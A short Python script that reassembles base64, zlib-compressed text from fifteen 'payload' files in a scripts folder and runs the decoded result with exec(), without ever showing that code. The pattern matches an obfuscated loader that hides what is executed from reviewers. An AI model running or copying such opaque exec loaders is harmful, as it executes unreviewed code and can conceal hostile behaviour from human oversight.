import base64
import zlib
from pathlib import Path

parts = [
    "scripts/v09794-payload-1.txt",
    "scripts/v09794-payload-2.txt",
    *[f"scripts/v09794-payload-3-{index}.txt" for index in range(1, 7)],
    "scripts/v09794-payload-4-1.txt",
    "scripts/v09794-payload-4-2.txt",
    "scripts/v09794-payload-4-3a.txt",
    "scripts/v09794-payload-4-3b.txt",
    "scripts/v09794-payload-4-4.txt",
    "scripts/v09794-payload-4-5.txt",
    "scripts/v09794-payload-4-6.txt",
]
payload = "".join(Path(path).read_text(encoding="utf-8").strip() for path in parts)
exec(zlib.decompress(base64.b64decode(payload)).decode(), {"__name__": "__main__"})
